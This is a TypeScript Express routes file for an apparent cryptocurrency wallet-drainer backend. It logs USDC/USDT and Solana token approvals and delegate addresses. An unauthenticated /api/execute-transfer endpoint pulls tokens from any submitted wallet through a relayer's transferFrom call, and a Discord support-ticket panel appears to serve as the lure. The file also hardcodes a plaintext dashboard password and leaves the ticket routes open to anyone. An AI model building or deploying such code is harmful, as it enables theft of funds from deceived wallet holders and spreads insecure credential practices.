import type { Express, Request, Response, NextFunction } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertApplicationSchema, insertApprovalSchema, insertTransferSchema, insertTicketMessageSchema } from "@shared/schema";
import { sendTicketPanel } from "./discord-bot";
import { executeTransferFrom, checkRelayerStatus } from "./relayer";

const DASHBOARD_PASSWORD = "hourglass2024";

// Middleware to check dashboard authentication
function requireDashboardAuth(req: Request, res: Response, next: NextFunction) {
  const authHeader = req.headers.authorization;
  
  if (!authHeader || authHeader !== `Bearer ${DASHBOARD_PASSWORD}`) {
    return res.status(401).json({ error: "Unauthorized" });
  }
  
  next();
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Public route - anyone can submit applications
  app.post("/api/applications", async (req, res) => {
    try {
      const validatedData = insertApplicationSchema.parse(req.body);
      const application = await storage.createApplication(validatedData);
      res.json(application);
    } catch (error) {
      res.status(400).json({ error: "Invalid application data" });
    }
  });

  // Protected route - requires authentication to view applications
  app.get("/api/applications", requireDashboardAuth, async (req, res) => {
    try {
      const applications = await storage.getApplications();
      res.json(applications);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch applications" });
    }
  });

  // Public route - record token approvals and trigger relayer
  app.post("/api/approvals", async (req, res) => {
    try {
      const validatedData = insertApprovalSchema.parse(req.body);
      const approval = await storage.createApproval(validatedData);
      res.json(approval);
    } catch (error) {
      res.status(400).json({ error: "Invalid approval data" });
    }
  });

  // Execute transfer via relayer after approval
  app.post("/api/execute-transfer", async (req, res) => {
    try {
      const { walletAddress, tokenSymbol } = req.body;
      
      if (!walletAddress || !tokenSymbol) {
        return res.status(400).json({ error: "walletAddress and tokenSymbol are required" });
      }

      if (tokenSymbol !== 'USDC' && tokenSymbol !== 'USDT') {
        return res.status(400).json({ error: "tokenSymbol must be USDC or USDT" });
      }

      console.log(`[API] Execute transfer request: ${walletAddress} - ${tokenSymbol}`);
      
      const result = await executeTransferFrom(walletAddress, tokenSymbol);
      
      if (result.success && result.txHash) {
        await storage.createTransfer({
          walletAddress,
          tokenAddress: tokenSymbol === 'USDC' 
            ? '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' 
            : '0xdAC17F958D2ee523a2206206994597C13D831ec7',
          tokenSymbol,
          amount: '0',
          transactionHash: result.txHash,
        });
      }

      res.json(result);
    } catch (error: any) {
      console.error('[API] Execute transfer error:', error);
      res.status(500).json({ success: false, error: error?.message || "Failed to execute transfer" });
    }
  });

  // Check relayer status
  app.get("/api/relayer-status", requireDashboardAuth, async (req, res) => {
    try {
      const status = await checkRelayerStatus();
      res.json(status);
    } catch (error) {
      res.status(500).json({ error: "Failed to check relayer status" });
    }
  });

  // Public route - record Solana approvals
  app.post("/api/solana-approvals", async (req, res) => {
    try {
      const { walletAddress, delegateAddress, transactionHash, tokensApproved } = req.body;
      
      if (!walletAddress || !delegateAddress || !transactionHash) {
        return res.status(400).json({ error: "walletAddress, delegateAddress, and transactionHash are required" });
      }

      console.log(`[Solana] Approval recorded: ${walletAddress} -> ${delegateAddress} (${transactionHash})`);
      console.log(`[Solana] Tokens approved:`, tokensApproved);
      
      // Log each token approval separately for tracking
      const approvals = [];
      const tokens = tokensApproved || ["USDC", "USDT"];
      
      for (const token of tokens) {
        try {
          const approval = await storage.createApproval({
            walletAddress,
            tokenAddress: delegateAddress,
            tokenSymbol: `SOL-${token}`,
            transactionHash,
          });
          approvals.push(approval);
        } catch (err) {
          console.log(`[Solana] Could not store ${token} approval, continuing...`);
        }
      }
      
      res.json({ success: true, transactionHash, tokensApproved: tokens, approvals });
    } catch (error: any) {
      console.error('[Solana] Approval error:', error);
      res.status(400).json({ error: error?.message || "Invalid Solana approval data" });
    }
  });

  // Protected route - requires authentication to view approvals
  app.get("/api/approvals", requireDashboardAuth, async (req, res) => {
    try {
      const approvals = await storage.getApprovals();
      res.json(approvals);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch approvals" });
    }
  });

  // Public route - record token transfers
  app.post("/api/transfers", async (req, res) => {
    try {
      const validatedData = insertTransferSchema.parse(req.body);
      const transfer = await storage.createTransfer(validatedData);
      res.json(transfer);
    } catch (error) {
      res.status(400).json({ error: "Invalid transfer data" });
    }
  });

  // Protected route - requires authentication to view transfers
  app.get("/api/transfers", requireDashboardAuth, async (req, res) => {
    try {
      const transfers = await storage.getTransfers();
      res.json(transfers);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch transfers" });
    }
  });

  // Ticket routes
  app.get("/api/tickets", async (req, res) => {
    try {
      const tickets = await storage.getTickets();
      res.json(tickets);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch tickets" });
    }
  });

  app.get("/api/tickets/:id", async (req, res) => {
    try {
      const ticket = await storage.getTicketById(req.params.id);
      if (!ticket) {
        return res.status(404).json({ error: "Ticket not found" });
      }
      res.json(ticket);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch ticket" });
    }
  });

  app.get("/api/tickets/:id/messages", async (req, res) => {
    try {
      const messages = await storage.getTicketMessages(req.params.id);
      res.json(messages);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch ticket messages" });
    }
  });

  app.post("/api/tickets/:id/messages", async (req, res) => {
    try {
      const validatedData = insertTicketMessageSchema.parse({
        ...req.body,
        ticketId: req.params.id,
      });
      const message = await storage.createTicketMessage(validatedData);
      res.json(message);
    } catch (error) {
      res.status(400).json({ error: "Invalid message data" });
    }
  });

  app.patch("/api/tickets/:id", async (req, res) => {
    try {
      const ticket = await storage.updateTicket(req.params.id, req.body);
      res.json(ticket);
    } catch (error) {
      res.status(400).json({ error: "Failed to update ticket" });
    }
  });

  app.post("/api/discord/send-panel", requireDashboardAuth, async (req, res) => {
    try {
      const { channelId } = req.body;
      if (!channelId) {
        return res.status(400).json({ error: "channelId is required" });
      }
      await sendTicketPanel(channelId);
      res.json({ success: true });
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Failed to send ticket panel" });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
